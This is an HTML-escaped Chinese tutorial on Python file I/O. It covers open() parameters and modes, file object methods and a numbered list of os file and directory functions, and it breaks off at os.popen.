&lt;h2 id=&#34;File-文件-方法&#34;&gt;&lt;a href=&#34;#File-文件-方法&#34; class=&#34;headerlink&#34; title=&#34;File(文件)方法&#34;&gt;&lt;/a&gt;File(文件)方法&lt;/h2&gt;&lt;h3 id=&#34;open-方法&#34;&gt;&lt;a href=&#34;#open-方法&#34; class=&#34;headerlink&#34; title=&#34;open()方法&#34;&gt;&lt;/a&gt;open()方法&lt;/h3&gt;&lt;p&gt;open() 函数常用形式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;完整的语法格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; buffering&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; encoding&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; errors&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; newline&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; closefd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; opener&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参数说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;file: 必需，文件路径（相对或者绝对路径）&lt;/li&gt;
&lt;li&gt;mode: 可选，文件打开模式&lt;/li&gt;
&lt;li&gt;buffering: 设置缓冲&lt;/li&gt;
&lt;li&gt;encoding: 一般使用utf8&lt;/li&gt;
&lt;li&gt;errors: 报错级别&lt;/li&gt;
&lt;li&gt;newline: 区分换行符&lt;/li&gt;
&lt;li&gt;closefd: 传入的file参数类型&lt;/li&gt;
&lt;li&gt;opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;mode 参数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;模式&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;t&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;文本模式 (默认)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;x&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;写模式，新建一个文件，如果该文件已存在则会报错。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;b&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;二进制模式。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件进行更新(可读可写)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;U&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;通用换行模式（&lt;strong&gt;Python 3 不支持&lt;/strong&gt;）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;r&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;rb&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;r+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。文件指针将会放在文件的开头。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;rb+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;w&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;wb&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;w+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;wb+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;a&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ab&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;a+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ab+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;默认为文本模式，如果要以二进制模式打开，加上 &lt;strong&gt;b&lt;/strong&gt; &lt;/p&gt;
&lt;h3 id=&#34;file-对象&#34;&gt;&lt;a href=&#34;#file-对象&#34; class=&#34;headerlink&#34; title=&#34;file 对象&#34;&gt;&lt;/a&gt;file 对象&lt;/h3&gt;&lt;p&gt;file 对象使用 open 函数来创建&lt;/p&gt;
&lt;p&gt;file 对象常用的函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;方法及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-close.html&#34;&gt;file.close()&lt;/a&gt;关闭文件。关闭后文件不能再进行读写操作。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-flush.html&#34;&gt;file.flush()&lt;/a&gt;刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-fileno.html&#34;&gt;file.fileno()&lt;/a&gt;返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-isatty.html&#34;&gt;file.isatty()&lt;/a&gt;如果文件连接到一个终端设备返回 True，否则返回 False。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-next.html&#34;&gt;file.next()&lt;/a&gt;&lt;strong&gt;Python 3 中的 File 对象不支持 next() 方法。&lt;/strong&gt;返回文件下一行。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[file.read(&lt;a href=&#34;https://www.runoob.com/python3/python3-file-read.html&#34;&gt;size])&lt;/a&gt;从文件读取指定的字节数，如果未给定或为负则读取所有。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[file.readline(&lt;a href=&#34;https://www.runoob.com/python3/python3-file-readline.html&#34;&gt;size])&lt;/a&gt;读取整行，包括 “\n” 字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[file.readlines(&lt;a href=&#34;https://www.runoob.com/python3/python3-file-readlines.html&#34;&gt;sizeint])&lt;/a&gt;读取所有行并返回列表，若给定sizeint&amp;gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[file.seek(offset&lt;a href=&#34;https://www.runoob.com/python3/python3-file-seek.html&#34;&gt;, whence])&lt;/a&gt;移动文件读取指针到指定位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-tell.html&#34;&gt;file.tell()&lt;/a&gt;返回文件当前位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[file.truncate(&lt;a href=&#34;https://www.runoob.com/python3/python3-file-truncate.html&#34;&gt;size])&lt;/a&gt;从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-write.html&#34;&gt;file.write(str)&lt;/a&gt;将字符串写入文件，返回的是写入的字符长度。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;13&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-file-writelines.html&#34;&gt;file.writelines(sequence)&lt;/a&gt;向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&#34;OS-文件-目录方法&#34;&gt;&lt;a href=&#34;#OS-文件-目录方法&#34; class=&#34;headerlink&#34; title=&#34;OS 文件/目录方法&#34;&gt;&lt;/a&gt;OS 文件/目录方法&lt;/h2&gt;&lt;p&gt;一部分函数只能在linux中使用&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;方法及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-access.html&#34;&gt;os.access(path, mode)&lt;/a&gt; 检验权限模式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-chdir.html&#34;&gt;os.chdir(path)&lt;/a&gt; 改变当前工作目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-chflags.html&#34;&gt;os.chflags(path, flags)&lt;/a&gt; 设置路径的标记为数字标记。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-chmod.html&#34;&gt;os.chmod(path, mode)&lt;/a&gt; 更改权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-chown.html&#34;&gt;os.chown(path, uid, gid)&lt;/a&gt; 更改文件所有者&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-chroot.html&#34;&gt;os.chroot(path)&lt;/a&gt; 改变当前进程的根目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-close.html&#34;&gt;os.close(fd)&lt;/a&gt; 关闭文件描述符 fd&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-closerange.html&#34;&gt;os.closerange(fd_low, fd_high)&lt;/a&gt; 关闭所有文件描述符，从 fd_low (包含) 到 fd_high (不包含), 错误会忽略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-dup.html&#34;&gt;os.dup(fd)&lt;/a&gt; 复制文件描述符 fd&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-dup2.html&#34;&gt;os.dup2(fd, fd2)&lt;/a&gt; 将一个文件描述符 fd 复制到另一个 fd2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fchdir.html&#34;&gt;os.fchdir(fd)&lt;/a&gt; 通过文件描述符改变当前工作目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fchmod.html&#34;&gt;os.fchmod(fd, mode)&lt;/a&gt; 改变一个文件的访问权限，该文件由参数fd指定，参数mode是Unix下的文件访问权限。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;13&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fchown.html&#34;&gt;os.fchown(fd, uid, gid)&lt;/a&gt; 修改一个文件的所有权，这个函数修改一个文件的用户ID和用户组ID，该文件由文件描述符fd指定。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;14&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fdatasync.html&#34;&gt;os.fdatasync(fd)&lt;/a&gt; 强制将文件写入磁盘，该文件由文件描述符fd指定，但是不强制更新文件的状态信息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;15&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.fdopen(fd&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fdopen.html&#34;&gt;, mode[, bufsize]])&lt;/a&gt; 通过文件描述符 fd 创建一个文件对象，并返回这个文件对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;16&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fpathconf.html&#34;&gt;os.fpathconf(fd, name)&lt;/a&gt; 返回一个打开的文件的系统配置信息。name为检索的系统配置的值，它也许是一个定义系统值的字符串，这些名字在很多标准中指定（POSIX.1, Unix 95, Unix 98, 和其它）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;17&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fstat.html&#34;&gt;os.fstat(fd)&lt;/a&gt; 返回文件描述符fd的状态，像stat()。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;18&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fstatvfs.html&#34;&gt;os.fstatvfs(fd)&lt;/a&gt; 返回包含文件描述符fd的文件的文件系统的信息，Python 3.3 相等于 statvfs()。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;19&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-fsync.html&#34;&gt;os.fsync(fd)&lt;/a&gt; 强制将文件描述符为fd的文件写入硬盘。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;20&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-ftruncate.html&#34;&gt;os.ftruncate(fd, length)&lt;/a&gt; 裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;21&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-getcwd.html&#34;&gt;os.getcwd()&lt;/a&gt; 返回当前工作目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;22&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-getcwdb.html&#34;&gt;os.getcwdb()&lt;/a&gt; 返回一个当前工作目录的Unicode对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;23&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-isatty.html&#34;&gt;os.isatty(fd)&lt;/a&gt; 如果文件描述符fd是打开的，同时与tty(-like)设备相连，则返回true, 否则False。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;24&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-lchflags.html&#34;&gt;os.lchflags(path, flags)&lt;/a&gt; 设置路径的标记为数字标记，类似 chflags()，但是没有软链接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;25&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-lchmod.html&#34;&gt;os.lchmod(path, mode)&lt;/a&gt; 修改连接文件权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;26&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-lchown.html&#34;&gt;os.lchown(path, uid, gid)&lt;/a&gt; 更改文件所有者，类似 chown，但是不追踪链接。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;27&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-link.html&#34;&gt;os.link(src, dst)&lt;/a&gt; 创建硬链接，名为参数 dst，指向参数 src&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;28&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-listdir.html&#34;&gt;os.listdir(path)&lt;/a&gt; 返回path指定的文件夹包含的文件或文件夹的名字的列表。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;29&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-lseek.html&#34;&gt;os.lseek(fd, pos, how)&lt;/a&gt; 设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix，Windows中有效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;30&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-lstat.html&#34;&gt;os.lstat(path)&lt;/a&gt; 像stat(),但是没有软链接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;31&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-major.html&#34;&gt;os.major(device)&lt;/a&gt; 从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;32&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-makedev.html&#34;&gt;os.makedev(major, minor)&lt;/a&gt; 以major和minor设备号组成一个原始设备号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;33&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.makedirs(path&lt;a href=&#34;https://www.runoob.com/python3/python3-os-makedirs.html&#34;&gt;, mode])&lt;/a&gt; 递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;34&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-minor.html&#34;&gt;os.minor(device)&lt;/a&gt; 从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;35&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.mkdir(path&lt;a href=&#34;https://www.runoob.com/python3/python3-os-mkdir.html&#34;&gt;, mode])&lt;/a&gt; 以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;36&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.mkfifo(path&lt;a href=&#34;https://www.runoob.com/python3/python3-os-mkfifo.html&#34;&gt;, mode])&lt;/a&gt; 创建命名管道，mode 为数字，默认为 0666 (八进制)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;37&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.mknod(filename&lt;a href=&#34;https://www.runoob.com/python3/python3-os-mknod.html&#34;&gt;, mode=0600, device])&lt;/a&gt; 创建一个名为filename文件系统节点（文件，设备特别文件或者命名pipe）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;38&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.open(file, flags&lt;a href=&#34;https://www.runoob.com/python3/python3-os-open.html&#34;&gt;, mode])&lt;/a&gt; 打开一个文件，并且设置需要的打开选项，mode参数是可选的&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;39&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-openpty.html&#34;&gt;os.openpty()&lt;/a&gt; 打开一个新的伪终端对。返回 pty 和 tty的文件描述符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;40&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-pathconf.html&#34;&gt;os.pathconf(path, name)&lt;/a&gt; 返回相关文件的系统配置信息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;41&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-pipe.html&#34;&gt;os.pipe()&lt;/a&gt; 创建一个管道. 返回一对文件描述符(r, w) 分别为读和写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;42&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.popen(command&lt;a href=&#34;https://www.runoob.com/python3/python3-os-popen.html&#34;&gt;, mode[, bufsize]])&lt;/a&gt; 从一个 command 打开一个管道&lt;/td&gt;
